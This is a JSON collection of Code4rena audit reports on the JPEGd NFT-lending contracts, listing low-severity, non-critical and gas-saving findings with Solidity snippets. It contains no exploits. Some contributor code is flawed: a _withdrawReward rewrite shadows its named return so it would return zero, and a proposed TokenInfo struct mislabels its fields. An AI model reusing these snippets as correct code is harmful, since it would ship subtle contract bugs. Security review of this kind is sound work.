[L-05] Fee in `StrategyPUSDConvex.setPerformanceFee()` should be upper-bounded\n\nSee `@audit`:\n\n```solidity\nFile: StrategyPUSDConvex.sol\n177:     function setPerformanceFee(Rate memory _performanceFee)\n178:         public\n179:         onlyRole(DEFAULT_ADMIN_ROLE)\n180:     {\n181:         require(\n182:             _performanceFee.denominator > 0 &&\n183:                 _performanceFee.denominator >= _performanceFee.numerator,\n184:             \"INVALID_RATE\"\n185:         );\n186:         performanceFee = _performanceFee; //@audit low: fee can be 100% (_performanceFee.denominator == _performanceFee.numerator)\n187:     }\n```\n\n## [L-06] Fee in `NFTVault.setOrganizationFeeRate()`should be upper-bounded\n\nSee `@audit`:\n\n```solidity\nFile: NFTVault.sol\n290:     function setOrganizationFeeRate(Rate memory _organizationFeeRate)  \n291:         external\n292:         onlyRole(DAO_ROLE)\n293:     {\n294:         _validateRate(_organizationFeeRate);\n295:         settings.organizationFeeRate = _organizationFeeRate; //@audit low: fee can be 100%\n296:     }\n...\n400:     function _validateRate(Rate memory rate) internal pure {\n401:         require(\n402:             rate.denominator > 0 && rate.denominator >= rate.numerator,  //@audit low: fee can be 100% (rate.denominator == rate.numerator)\n403:             \"invalid_rate\"\n404:         );\n405:     }\n```\n\n## [L-07] A magical number should be documented and explained: `1e36`. Use a constant instead\n\n```solidity\nfarming/LPFarming.sol:196:                1e36 *\nfarming/LPFarming.sol:207:            1e36;\nfarming/LPFarming.sol:307:            1e36 *\nfarming/LPFarming.sol:319:            1e36;\nfarming/yVaultLPFarming.sol:94:            1e36;\nfarming/yVaultLPFarming.sol:172:        newAccRewardsPerShare = accRewardPerShare + newRewards * 1e36 / totalStaked;\nfarming/yVaultLPFarming.sol:179:            (accRewardPerShare - userLastAccRewardPerShare[account])) / 1e36;\n```\n\nI suggest using `constant` variables as this would make the code more maintainable and readable while costing nothing gas-wise.\n\n## [N-01] Avoid floating pragmas: the version should be locked (preferably at >= `0.8.4`)\n\nThe pragma declared across the solution is `^0.8.0`. As the compiler introduces a several interesting upgrades in Solidity `0.8.4`, consider locking at this version or a more recent one.\n\n## [N-02] Related data should be grouped in a struct\n\nThe following `maps` should be grouped in structs.\n\nFrom:\n\n```solidity\ncontracts/farming/yVaultLPFarming.sol:\n  31:     mapping(address => uint256) public balanceOf; //@audit NC: related data 1\n  32:     mapping(address => uint256) private userLastAccRewardPerShare;//@audit NC: related data 2\n  33:     mapping(address => uint256) private userPendingRewards;//@audit NC: related data 3\n\ncontracts/vaults/yVault/Controller.sol:\n  20:     mapping(IERC20 => address) public vaults; //@audit NC: related data 1\n  21:     mapping(IERC20 => IStrategy) public strategies; //@audit NC: related data 2\n  22:     mapping(IERC20 => mapping(IStrategy => bool)) public approvedStrategies; //@audit NC: related data 3\n```\n\nTo\n\n```solidity\n    struct UserInfo {\n        uint256 balance;  \n        uint256 lastAccRewardPerShare;\n        uint256 pendingReward;\n    }\n    \n    mapping(address => UserInfo) public userInfo;\n```\n\nAnd\n\n```solidity\n    struct TokenInfo {\n        address vaults;  \n        IStrategy approvedStrategies;\n        mapping(IStrategy => bool) pendingReward;\n    }\n    \n    mapping(IERC20 => TokenInfo) public tokenInfo;\n```\n\nIt would be less error-prone, more readable, and it would be possible to delete all related fields with a simple `delete userInfo[address]`.\n\nHowever, the sponsor should notice that `pendingReward` won't be as easily deleted in `tokenInfo`, as it's a `mapping` field. It would still improve code quality nonetheless.\n\n## [N-03] Unused named returns\n\nUsing both named returns and a return statement isn't necessary. Removing one of those can improve code clarity (see `@audit`):\n\n```solidity\nFile: NFTEscrow.sol\n081:     function precompute(address _owner, uint256 _idx)\n082:         public\n083:         view\n084:         returns (bytes32 salt, address predictedAddress) //@audit NC: unused named returns\n085:     {\n...\n091:         salt = sha256(abi.encodePacked(_owner));\n...\n105:         predictedAddress = address(uint160(uint256(hash)));\n106:         return (salt, predictedAddress); //@audit NC: unused named returns\n107:     }\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/225"
    }
  },
  {
    "title": "QA Report",
    "body": "2022-04-jpegd\n\n1 follow the 𝐂𝐇𝐄𝐂𝐊 𝐄𝐅𝐅𝐄𝐂𝐓𝐒 𝐈𝐍𝐓𝐄𝐑𝐀𝐂𝐓𝐈𝐎𝐍 𝐏𝐚𝐭𝐭𝐞𝐫𝐧 in deposit and claimAll.\nThe function deposit and claimAll don’t follow the check effects interaction pattern.\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L214\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L356-L357\n\n\nUpdate user.amount before transferFrom and userRewards[msg.sender] in claimAll.\n\n2 use safeTransfer and safeTransferFrom in JPEGStaking.sol. SafeERC20Upgradeable is imported for IERC20Upgradeable. However, it is not used. You must use it in stake and unstake.\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/staking/JPEGStaking.sol#L34\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/staking/JPEGStaking.sol#L52\n\njpeg.safeTransferFrom(msg.sender, address(this), _amount);\njpeg.safeTransfer(msg.sender, _amount);\n\n3 use call to transfer ETH. the following line uses transfer to send ETH. However, call is recommended to send ETH. You need also check the return value of call if the transfer is successful is or not.\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L201\n\nif (collateralAsset == ETH) {\n  (bool success, ) = msg.sender.call{value: amount}(\"\");\n  require(success, “Transfer failed”);\n}\n\n4 import safeERC20 and use safeTransferFrom instead of transferFrom in repurchase.\nIn the following line, transferFrom is used. You can replace it with safeTransferFrom to transfer ERC20 token.\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L899\n\nusing safeERC20 for IStableCoin;\nstablecoin.safeTransferFrom(msg.sender, position.liquidator, debtAmount + penalty);\n\n5 Lock pragmas to specific compiler version. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\nFor example, \n\npragma solidity 0.8.0; ",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/224"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "#1\nTitle: Using != is more efficient\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L114\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L218\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L239\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/staking/JPEGStaking.sol#L32\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/staking/JPEGStaking.sol#L46\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L143\nUsing != instead of > is more gas efficient for checking that the var is not 0\n\n\n\n#2\nTitle: Using ERC20.function instead of SafeERC20.function lib for jpeg\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L128\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L130\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L339\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L356\nERC20.functions is way cheaper to use. Its unnecessary to use SafeERC20 lib because jpeg is ERC20 standard token\n\n\n\n#3\nTitle: Using if statement instead else if\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L129\nThe execution on condition in L127 and L129 won't executed at the same time. Using if statement can reduce 37 gas consumption \n```\n        if (remainingRewards > newRewards) {\n            jpeg.safeTransfer(msg.sender, remainingRewards - newRewards);\n        }\n\tif (remainingRewards < newRewards) { //@audit-info: Replacing else if with if statement here\n            jpeg.safeTransferFrom(\n                msg.sender,\n                address(this),\n                newRewards - remainingRewards\n        );\n``` \n\n\n\n#4\nTitle: gas opt in `set()` function\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L159\nChecking that prevAllocPoint != _allocPoint early can save gas consumption (or just throw an error message earlier), than just execute all the line above it\nChange to:\n```\n    function set(uint256 _pid, uint256 _allocPoint) external onlyOwner {\n\t_massUpdatePools();\n\tuint256 prevAllocPoint = poolInfo[_pid].allocPoint;\n        if (prevAllocPoint != _allocPoint) { //@audit-info: check here\n\t\t\n\n        \tpoolInfo[_pid].allocPoint = _allocPoint; //@audit-info: prevent SSTORE here\n        \n            \ttotalAllocPoint = totalAllocPoint - prevAllocPoint + _allocPoint;\n        }\n    }\n```\nIts will prevent unnecessary SSTORE\n\n\n\n#5\nTitle: Using += to increase value on var\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L226\nChange:\n```\n        user.amount = user.amount + _amount;\n\n```\nTo\n```\n        user.amount += _amount;\n\n```\nAlso at:\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L145\n\n\n\n#6\nTitle: Using delete statement to empty `userReward`\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L340\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L357\nChange:\n```\n        userRewards[msg.sender] = 0;\n\n```\nTo:\n```\n\tdelete userRewards[msg.sender];\n```\n\n\n\n#7\nTitle: Gas improvement on returning _withdrawReward value\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L315-L327\nBy setting pending in function `returns` and deleting L326 can save gas.\nChange to:\n```\n    function _withdrawReward(uint256 _pid) internal returns (uint256 pending) { //@audit-info: return\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        uint256 pending = (user.amount *\n            (poolInfo[_pid].accRewardPerShare - user.lastAccRewardPerShare)) /\n            1e36;\n        if (pending > 0) {\n            userRewards[msg.sender] += pending;\n        }\n\n        user.lastAccRewardPerShare = poolInfo[_pid].accRewardPerShare;\n\t//@audit-info: no return\n    }\n\n```\nSame at:\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L177-L186\n\n\n\n#8\nTitle: Unnecessary var init with default value\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L281\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L348\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L231\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L181-L184\nDeclaring uint with 0 value is gas consuming. Just remove `= 0`\n\n\n\n#9\nTitle: Using unchecked and prefix increment\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L281\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L348\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L231\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L181-L184\nChange to:\n```\n        for (uint256 pid = 0; pid < length;) {\n            _updatePool(pid);\n\tunchecked{\n\t\t++pid //@audit-info: Place here with unchecked\n\t\t};\n        }\n```\n\n\n\n#10\nTitle: Caching poolInfo.length can save gas\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L348\nAs the loop in [_massUpdatePools](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L280) which caching `poolInfo.length`, same method can be used in `claimAll` function\n\n\n\n#11\nTitle: Unnecessary MSTORE `newReward`\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L170\nMSTORing the calculation is unnecessary and cost gas. Just pass `cuerrnetBalance - previousBalance` to the `newAccRewardPerShare` calculation\n```\nnewAccRewardsPerShare = accRewardPerShare + (currentBalance - previousBalance) * 1e36 / totalStaked;\n```\n\n\n\n#12\nTitle: Using msg.sender instead _msgSender()\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/tokens/StableCoin.sol#L26\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/tokens/StableCoin.sol#L40\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/tokens/StableCoin.sol#L54\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/tokens/StableCoin.sol#L68\nUsing msg.sender instead _msgSender() is more effective. I recommend to replace all _msgSender() with msg.sender\n\n\n\n#13\nTitle: Using && is less gas optimum in require\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/tokens/StableCoin.sol#L68\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L100\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L93-L98\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L194\nUsing multiple require() than && can save 15 execution gas fee, however it cost more on deployment gas fee(better use on function which are called many times):\n```\nrequire(\n            _performanceFee.denominator > 0,\n            \"INVALID_RATE\"\n        );\nrequire(\n                _performanceFee.denominator >= _performanceFee.numerator,\n            \"INVALID_RATE\"\n        );\n```\n\n\n\n#14\nTitle: Using delete statement to set mapping false\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/Controller.sol#L76\nUsing delete statement to set mapping with bool value to false is more effective\n```\n        delete approvedStrategies[_token][_strategy];\n```\n\n\n\n#15\nTitle: Don't need to use == true to validate bool value == true\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/Controller.sol#L87\nChange to:\n```\nrequire(\n            approvedStrategies[_token][_strategy], // @audit-info remove == true\n            \"STRATEGY_NOT_APPROVED\"\n        );\n```\n\n\n\n#16\nTitle: Using calldata to declare read only struct parameter\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L70\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L212\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L222\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L232\nUsing `calldata` to store `_creditLimitRate` can save gas because it is read only var\n\n\n\n#17\nTitle: Using if statement to determine amount value\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L182\nChanging the code to:\n```\nif(amount > debtAmount)amount = debtAmount;\n```\nCan save execution gas fee in most case:\n- if amount < debtAmount, it will save 16 gas because of avoiding MSTORE\n- if amount == debtAmount, same\n- if amount > debtAmount, 2 more expensive gas cost.\nConsidering that `WHITELISTED_ROLE ` will inputting amount is > than debtAmount is the rarest case from all cases above, this way is the most effective way\n\n\n\n#18\nTitle: Using unchecked to calculate `collateralAmount` in `withdraw()`\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L199\n`amount` value was checked that it won't > than `collateralAmount` so using unchecked can save gas:\n```\nunchecked{\n\tcollateralAmount -= amount;\n}\n```\n\n\n\n#19\nTitle: Unnecessary `creditLimit` MSTORE in `withdraw()`\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L196\nBy passing `getCreditLimit(collateralAmount - amount)` directly to L197 without storing it to `credit limit` can save gas without damaging readability of the code (The function name is clear that we are getting credit limit value):\n```\nrequire(getCreditLimit(collateralAmount - amount) >= debtAmount, \"insufficient_credit\");\n```\n\n\n\n#20\nTitle: Using storage to store initializer struct var can save gas\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L182\nReading from storage than caching struct to memory can save execution gas cost:\n```\n            NFTCategoryInitializer storage initializer = _typeInitializers[i];\n```\n\n\n\n#21\nTitle: Tight vars packing in `PositionPreview` struct\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L610-L623\nBool has 1 byte size, address has 20 bytes size (< 32). Grouping them together can save 1 slot, which can save gas:\n```\nstruct PositionPreview {\n        address owner;\n        bool liquidatable; //@audit-info: move here\n        uint256 nftIndex;\n        bytes32 nftType;\n        uint256 nftValueUSD;\n        VaultSettings vaultSettings;\n        uint256 creditLimit;\n        uint256 debtPrincipal;\n        uint256 debtInterest;\n        BorrowType borrowType;\n        uint256 liquidatedAt;\n        address liquidator;\n    }\n```\n\n\n\n#22\nTitle: Avoiding MLOAD by using `msg.sender`\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L559-L574\nIt is clear that `_owner` in `_openPosition` is `msg.sender`. Replacing it with msg.sender can save gas\nChange it to:\n```\n    function _openPosition(address, uint256 _nftIndex) internal {\n        nftContract.transferFrom(msg.sender, address(this), _nftIndex); //@audit-info: here\n\n        positions[_nftIndex] = Position({\n            borrowType: BorrowType.NOT_CONFIRMED,\n            debtPrincipal: 0,\n            debtPortion: 0,\n            debtAmountForRepurchase: 0,\n            liquidatedAt: 0,\n            liquidator: address(0)\n        });\n        positionOwner[_nftIndex] = msg.sender;\n        positionIndexes.add(_nftIndex);\n\n        emit PositionOpened(msg.sender, _nftIndex);\n    }\n```",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/216"
    }
  },
  {
    "title": "QA Report",
    "body": "## Issue #1 (Low) - Floating Pragma\nAll contracts contain a floating pragma. It is recommended to deploy all contracts with a single, specific compiler version to reduce the risk of compiler-specific bugs and contracts deployed with different versions. \n\nA single example can be found here: https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L2\n\n\n## Issue #2 (Low) - Lack of CEI Pattern\nIn `LPFarming.sol`, the `claim()` and `claimAll()` functions do not follow a proper checks-effects-interactions pattern. There is no vulnerability in these functions due to the `nonReentrant` modifier and apparent lack of control flow transfer with the JPEG token, however, it is a simple security upgrade to move the `userRewards[msg.sender] = 0` line above `jpeg.safeTransfer(msg.sender, rewards);`\n\n### Link to code\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L339-L340\n\n\n\n## Issue #3 (Low) - Comment vs code conflict for newEpoch\nAs discussed in my previously submitted Medium finding called \"Owner of LPFarming.sol can DOS rewards by stopping epoch at any time\", there are two discrepancies between the comments of the `newEpoch()` function  and the code implementation.\n\n1. Comment says \"@notice Allows the owner to start a new epoch. Can only be called when there's no ongoing epoch\". There are no checks in the code whether there is an ongoing epoch or not.\n2. Comment says \"@param _startBlock The new epoch's start block. Has to be greater than the previous epoch's `endBlock`\". There are no checks that the new epoch's start block is greater than the original epoch's end block.\n\n### Link to code\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L103-L104\n\n\n## Issue #4 (Low) - Front-runnable initializer\nLack of access control on initialize(), can be front-run requiring re-deployment.\n\n### Link to code\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L139-L149\n\n\n## Issue #5 (Low) - Input addresses should verify != 0\nSeveral addresses set in the following initialize function do not verify that the input address are not the zero address. \n\n### Links to code\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L170-L176\n\n\n## Issue #6 (Low) - Call to `.decimals()` which may not be supported for all tokens\nDepending on the function used to deposit in `yVault.sol`, a call to `token.decimals()` may return errors since `decimals()` is not and ERC20 standard function.\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L70-L72\n\n\n## Issue #7 (Low) - Comment vs Code conflict for setContractWhitelisted\nThe `setContractWhitelisted()` function explains that calling this function allows the owner to whitelist contracts. This is slightly untrue since the function does not include any logic to determine if the address is a contract or not. Therefore, EOA's can be added to the contract address. The logic to decipher if the account is a contract or EOA is used higher up in the same contract. Adding a check for only contracts will make the comments match the function execution.\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L65-L70\n\n## Issue #8 (Non-critical) - Insurance typo\nInsurace should be spelled insurance.\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L67\n\n## Issue #9 (Non-critical) - Condition order continuity\nIt would make sense to order the conditions of the following statements in the same fashion to increase code clarity.\n\n```  address(0) == positionOwner[_nftIndex] ```\n\n``` positionOwner[_nftIndex] == address(0)   ```\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L682-L695",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/215"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### Not using the named return variables when a function returns, wastes deployment gas\n\n1. File: contracts/escrow/NFTEscrow.sol (line [106](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L106))\n```solidity\n        return (salt, predictedAddress);\n```\n2. File: contracts/escrow/NFTEscrow.sol (line [106](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L106))\n```solidity\n        return (salt, predictedAddress);\n```\n\n### `require()`/`revert()` strings longer than 32 bytes cost extra gas\n\n1. File: contracts/vaults/NFTVault.sol (lines [391-395](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L391-L395))\n```solidity\n        require(\n            _liquidationLimitRate.numerator * _creditLimitRate.denominator >\n                _creditLimitRate.numerator * _liquidationLimitRate.denominator,\n            \"credit_rate_exceeds_or_equals_liquidation_rate\"\n        );\n```\n2. File: contracts/tokens/StableCoin.sol (lines [39-42](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L39-L42))\n```solidity\n        require(\n            hasRole(MINTER_ROLE, _msgSender()),\n            \"StableCoin: must have minter role to mint\"\n        );\n```\n3. File: contracts/tokens/StableCoin.sol (lines [53-56](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L53-L56))\n```solidity\n        require(\n            hasRole(PAUSER_ROLE, _msgSender()),\n            \"StableCoin: must have pauser role to pause\"\n        );\n```\n4. File: contracts/tokens/StableCoin.sol (lines [67-70](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L67-L70))\n```solidity\n        require(\n            hasRole(PAUSER_ROLE, _msgSender()),\n            \"StableCoin: must have pauser role to unpause\"\n        );\n```\n5. File: contracts/tokens/JPEG.sol (lines [21-24](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L21-L24))\n```solidity\n        require(\n            hasRole(MINTER_ROLE, _msgSender()),\n            \"JPEG: must have minter role to mint\"\n        );\n```\n\n### Use a more recent version of solidity\nUse a solidity version of at least 0.8.2 to get compiler automatic inlining\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n1. File: contracts/escrow/NFTEscrow.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n2. File: contracts/vaults/NFTVault.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n3. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n4. File: contracts/vaults/yVault/Controller.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n5. File: contracts/vaults/yVault/yVault.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n6. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n7. File: contracts/tokens/StableCoin.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n8. File: contracts/tokens/JPEG.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n9. File: contracts/staking/JPEGStaking.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n10. File: contracts/farming/yVaultLPFarming.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n11. File: contracts/farming/LPFarming.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n12. File: contracts/lock/JPEGLock.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/lock/JPEGLock.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n13. File: contracts/helpers/CryptoPunksHelper.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n14. File: contracts/helpers/EtherRocksHelper.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/EtherRocksHelper.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n\n### Using `bool`s for storage incurs overhead\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\n\n1. File: contracts/vaults/NFTVault.sol (line [91](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L91))\n```solidity\n    bool public daoFloorOverride;\n```\n2. File: contracts/vaults/NFTVault.sol (line [93](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L93))\n```solidity\n    bool public useFallbackOracle;\n```\n3. File: contracts/vaults/yVault/Controller.sol (line [22](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L22))\n```solidity\n    mapping(IERC20 => mapping(IStrategy => bool)) public approvedStrategies;\n```\n4. File: contracts/vaults/yVault/yVault.sol (line 